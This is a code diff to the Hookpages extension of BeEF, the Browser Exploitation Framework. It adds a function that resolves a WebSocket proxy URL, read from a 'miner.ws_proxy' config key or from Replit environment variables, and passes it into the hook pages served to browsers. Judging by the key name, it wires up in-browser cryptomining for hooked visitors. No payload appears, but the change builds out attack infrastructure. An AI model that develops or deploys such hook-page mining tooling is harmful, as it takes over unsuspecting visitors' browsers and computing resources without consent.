@@ -9,6 +9,27 @@ require 'json'
 module BeEF
   module Extension
     module Hookpages
+
+      # ── Auto-detect the WebSocket proxy URL ──────────────────────────────────
+      # Priority:
+      #   1. Configured ws_proxy (if not a placeholder)
+      #   2. REPLIT_DEV_DOMAIN env var → wss://domain:8080
+      #   3. Request host → wss://host:8080
+      def self.resolve_ws_proxy(req = nil)
+        cfg_url = BeEF::Core::Configuration.instance
+                    .get('beef.extension.hookpages.miner.ws_proxy').to_s.strip
+        return cfg_url unless cfg_url.empty? || cfg_url.include?('YOUR_DOMAIN')
+
+        dev_domain = (ENV['REPLIT_DEV_DOMAIN'] || ENV['REPLIT_DOMAINS'] || '').strip
+        unless dev_domain.empty?
+          return "wss://#{dev_domain}:8080"
+        end
+
+        return '' unless req
+        proto = req.ssl? ? 'wss' : 'ws'
+        "#{proto}://#{req.host}:8080"
+      end
+
       class Handler < BeEF::Core::Router::Router
         set :public_folder, File.expand_path('html', __dir__)
 
@@ -60,7 +81,8 @@ module BeEF
 
           if page
             content_type 'text/html'
-            BeEF::Extension::Hookpages.render_page(page)
+            ws_proxy = BeEF::Extension::Hookpages.resolve_ws_proxy(request)
+            BeEF::Extension::Hookpages.render_page(page, ws_proxy)
           else
             status 404
             content_type 'text/html'
